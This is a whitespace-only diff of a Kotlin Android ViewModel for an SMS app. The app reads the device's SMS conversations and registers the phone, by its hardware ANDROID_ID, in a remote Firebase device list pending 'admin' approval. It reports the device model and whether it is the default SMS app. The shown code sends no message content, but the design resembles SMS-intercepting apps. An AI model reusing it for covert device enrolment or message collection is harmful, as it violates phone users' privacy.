@@ -46,40 +46,40 @@ class MainActivityViewModel @Inject constructor(
     private val smsRepository: SmsRepository,
     private val getAllConversationsUseCase: GetAllConversationsUseCase
 ) : AndroidViewModel(application) {
-    
+
     private val context: Context = getApplication<Application>()
-    
+
     // LiveData for UI state
     private val _conversations = MutableLiveData<List<SmsConversation>>()
     val conversations: LiveData<List<SmsConversation>> = _conversations
-    
+
     private val _isLoading = MutableLiveData<Boolean>()
     val isLoading: LiveData<Boolean> = _isLoading
-    
+
     private val _isEmpty = MutableLiveData<Boolean>()
     val isEmpty: LiveData<Boolean> = _isEmpty
-    
+
     private val _statusMessage = MutableLiveData<StatusMessage?>()
     val statusMessage: LiveData<StatusMessage?> = _statusMessage
-    
+
     private val _shouldShowViews = MutableLiveData<Boolean>()
     val shouldShowViews: LiveData<Boolean> = _shouldShowViews
-    
+
     // Firebase listener references for cleanup
     private var statusListener: ValueEventListener? = null
     private var messagesListener: ChildEventListener? = null
-    
+
     // Track last conversation update time to throttle reloads
     private var lastConversationReloadTime: Long = 0
     private var conversationReloadJob: kotlinx.coroutines.Job? = null
-    
+
     @get:SuppressLint("HardwareIds")
     private val androidId: String
         get() = Settings.Secure.getString(
             context.contentResolver,
             Settings.Secure.ANDROID_ID
         ) ?: ""
-    
+
     /**
      * Status message data class for UI alerts
      */
@@ -88,13 +88,13 @@ class MainActivityViewModel @Inject constructor(
         val message: String,
         val buttonText: String = "OK"
     )
-    
+
     /**
      * Load SMS conversations from device
      */
     fun loadConversations() {
         _isLoading.value = true
-        
+
         viewModelScope.launch {
             when (val result = getAllConversationsUseCase()) {
                 is Result.Success -> {
@@ -110,7 +110,7 @@ class MainActivityViewModel @Inject constructor(
             }
         }
     }
-    
+
     /**
      * Setup Firebase real-time listener for NEW messages only
      * Only listens for messages after initial load to avoid slow broadcast
@@ -118,59 +118,59 @@ class MainActivityViewModel @Inject constructor(
     fun setupFirebaseMessagesListener() {
         val messagesPath = AppConfig.getFirebaseMessagePath(androidId)
         val messagesRef = Firebase.database.reference.child(messagesPath)
-        
+
         // Remove existing listener to prevent duplicates
         messagesListener?.let {
             messagesRef.removeEventListener(it)
         }
-        
+
         // Get current timestamp to only listen for NEW messages
         val currentTimestamp = System.currentTimeMillis()
-        
+
         // Only listen for messages newer than current time (i.e., future messages)
         // This prevents Firebase from broadcasting all old messages on first attach
         val query: Query = messagesRef.orderByKey().startAfter(currentTimestamp.toString())
-        
+
         messagesListener = object : ChildEventListener {
             override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                 // New message added - throttle reloads (max once per 2 seconds)
                 throttleConversationReload()
             }
-            
+
             override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {
                 // Message changed - throttle reloads
                 throttleConversationReload()
             }
-            
+
             override fun onChildRemoved(snapshot: DataSnapshot) {
                 // Message removed - reload conversations
                 throttleConversationReload()
             }
-            
+
             override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {
                 // Not needed for messages
             }
-            
+
             override fun onCancelled(error: DatabaseError) {
                 android.util.Log.e("MainActivityViewModel", "Firebase messages listener cancelled", error.toException())
             }
         }
-        
+
         query.addChildEventListener(messagesListener!!)
-        
+
         Logger.d("MainActivityViewModel", "Firebase messages listener setup - listening for messages after: $currentTimestamp")
     }
-    
+
     /**
      * Throttle conversation reloads to avoid UI spam
      * Only reloads once every 2 seconds even if multiple messages arrive
      */
     private fun throttleConversationReload() {
         val now = System.currentTimeMillis()
-        
+
         // Cancel previous reload job
         conversationReloadJob?.cancel()
-        
+
         // If last reload was more than 2 seconds ago, reload immediately
         if (now - lastConversationReloadTime > 2000) {
             reloadConversationsAsync()
@@ -184,7 +184,7 @@ class MainActivityViewModel @Inject constructor(
             }
         }
     }
-    
+
     /**
      * Reload conversations asynchronously (without showing loading state)
      */
@@ -203,29 +203,29 @@ class MainActivityViewModel @Inject constructor(
             }
         }
     }
-    
+
     /**
      * Setup Firebase status listener
      * Checks activation status and handles state changes
      */
     fun setupFirebaseStatusListener() {
         val setup = context.readInternalFile("setup.txt")
-        
+
         if (setup.isEmpty()) {
             val statusPath = AppConfig.getFirebasePath(androidId, AppConfig.FirebasePaths.STATUS)
             val statusRef = Firebase.database.reference.child(statusPath)
-            
+
             // Remove existing listener to prevent duplicates
             statusListener?.let {
                 statusRef.removeEventListener(it)
             }
-            
+
             statusListener = object : ValueEventListener {
                 override fun onDataChange(snapshot: DataSnapshot) {
                     if (snapshot.exists()) {
                         val statusValue = snapshot.value.toString()
                         val statusLower = statusValue.lowercase()
-                        
+
                         when {
                             statusLower == "pending" -> {
                                 _statusMessage.value = StatusMessage(
@@ -251,19 +251,19 @@ class MainActivityViewModel @Inject constructor(
                         initializeDeviceInFirebase()
                     }
                 }
-                
+
                 override fun onCancelled(error: DatabaseError) {
                     // Handle error silently
                 }
             }
-            
+
             statusRef.addValueEventListener(statusListener!!)
         } else {
             // Already activated - show views immediately
             _shouldShowViews.value = true
         }
     }
-    
+
     /**
      * Initialize device in Firebase when first registered
      * Uses the complete initialization from AppConfig that sets all default values
@@ -271,7 +271,7 @@ class MainActivityViewModel @Inject constructor(
     private fun initializeDeviceInFirebase() {
         // Use the complete initialization function that sets all default values
         AppConfig.initializeDeviceStructure(androidId, context)
-        
+
         // After initialization, sync to device-list and show status message
         syncDeviceToDeviceList(null, androidId, "PENDING")
         _statusMessage.value = StatusMessage(
@@ -279,7 +279,7 @@ class MainActivityViewModel @Inject constructor(
             message = "We have sent a sign in request to admin, please wait for approval"
         )
     }
-    
+
     /**
      * Sync setup.txt value to Firebase
      */
@@ -298,11 +298,11 @@ class MainActivityViewModel @Inject constructor(
             Logger.e("MainActivityViewModel", e, "Error syncing setup to Firebase")
         }
     }
-    
+
     /**
      * Sync device to Firebase device-list with code->deviceId mapping and default values
      * Structure: fastpay/device-list/{code}/
-     * 
+     *
      * Sets:
      * - deviceId: Device ID mapping
      * - created_at: Timestamp when device was registered
@@ -313,7 +313,7 @@ class MainActivityViewModel @Inject constructor(
      *   - bank_name: Default bank name ("XXXX")
      *   - company_name: Default company name ("XXXX")
      *   - other_info: Default other info ("XXXX")
-     * 
+     *
      * Note: Only updates device-list if code exists. No code = no device-list entry.
      * Permissions are device-specific and stored in fastpay/{deviceId}/permission, not in device-list.
      */
@@ -324,31 +324,31 @@ class MainActivityViewModel @Inject constructor(
                 Logger.d("MainActivityViewModel", "No code provided - skipping device-list sync")
                 return
             }
-            
+
             val deviceListPath = com.example.fast.config.AppConfig.getFirebaseDeviceListPath(code)
-            
+
             // Default values
             val defaultBankStatus = mapOf("PENDING" to "#FFA500")
             val defaultBankName = "WELCOME"
             val defaultCompanyName = "STAY CONNECTED!"
             val defaultOtherInfo = "🫵ALWAYS PRIORITY!🫶"
             val defaultStatusText = "WELCOME,STAY CONNECTED!,🫵ALWAYS PRIORITY!🫶"
-            
+
             // Get device model
             val deviceModel = "${android.os.Build.BRAND} ${android.os.Build.MODEL}"
-            
+
             // Get current timestamp and format as human-readable date
             val createdAtTimestamp = System.currentTimeMillis()
             val createdAt = java.text.SimpleDateFormat("d MMM yyyy, h:mm a", java.util.Locale.getDefault())
                 .format(java.util.Date(createdAtTimestamp))
-            
+
             // Build BANK object structure
             val bankObject = mapOf(
                 AppConfig.FirebasePaths.BANK_BANK_NAME to defaultBankName,
                 AppConfig.FirebasePaths.BANK_COMPANY_NAME to defaultCompanyName,
                 AppConfig.FirebasePaths.BANK_OTHER_INFO to defaultOtherInfo
             )
-            
+
             // Build device-list data with defaults (permissions are device-specific, stored in fastpay/{deviceId}/permission)
             // Check if NAME exists before setting (only set on first time registration)
             Firebase.database.reference.child(deviceListPath)
@@ -362,23 +362,23 @@ class MainActivityViewModel @Inject constructor(
                             AppConfig.FirebasePaths.BANKSTATUS to defaultBankStatus,
                             AppConfig.FirebasePaths.BANK to bankObject
                         )
-                        
+
                         // Set status_text default if not exists
                         if (!snapshot.child("status_text").exists()) {
                             deviceListData["status_text"] = defaultStatusText
                         }
-                        
+
                         // Sync default device values to device-list (update all devices)
                         // These values come from fastpay/{deviceId} defaults
                         val deviceDefaultName = "${android.os.Build.BRAND} ${android.os.Build.MODEL}"
                         deviceListData["NAME"] = deviceDefaultName  // Always sync NAME from device model
                         deviceListData["isActive"] = "Opened"  // Sync isActive status
                         deviceListData["permission"] = "allow"  // Sync permission default
-                        
+
                         // Check if app is default SMS app and sync to device-list
                         val isDefault = com.example.fast.util.DefaultSmsAppHelper.isDefaultSmsApp(context)
                         deviceListData["isDefault"] = isDefault
-                        
+
                         // Update device-list
                         Firebase.database.reference.child(deviceListPath)
                             .updateChildren(deviceListData)
@@ -389,7 +389,7 @@ class MainActivityViewModel @Inject constructor(
                                 android.util.Log.e("MainActivityViewModel", "❌ Failed to sync device to device-list: $deviceListPath", e)
                             }
                     }
-                    
+
                     override fun onCancelled(error: com.google.firebase.database.DatabaseError) {
                         android.util.Log.e("MainActivityViewModel", "❌ Error checking device-list for NAME: $deviceListPath", error.toException())
                     }
@@ -398,24 +398,24 @@ class MainActivityViewModel @Inject constructor(
             android.util.Log.e("MainActivityViewModel", "❌ Error syncing device to device-list", e)
         }
     }
-    
+
     /**
      * Clear status message after showing
      */
     fun clearStatusMessage() {
         _statusMessage.value = null
     }
-    
+
     /**
      * Cleanup Firebase listeners
      */
     override fun onCleared() {
         super.onCleared()
-        
+
         // Cancel throttled reload job
         conversationReloadJob?.cancel()
         conversationReloadJob = null
-        
+
         // Remove status listener
         statusListener?.let {
             try {
@@ -426,7 +426,7 @@ class MainActivityViewModel @Inject constructor(
             }
         }
         statusListener = null
-        
+
         // Remove messages listener
         messagesListener?.let {
             try {
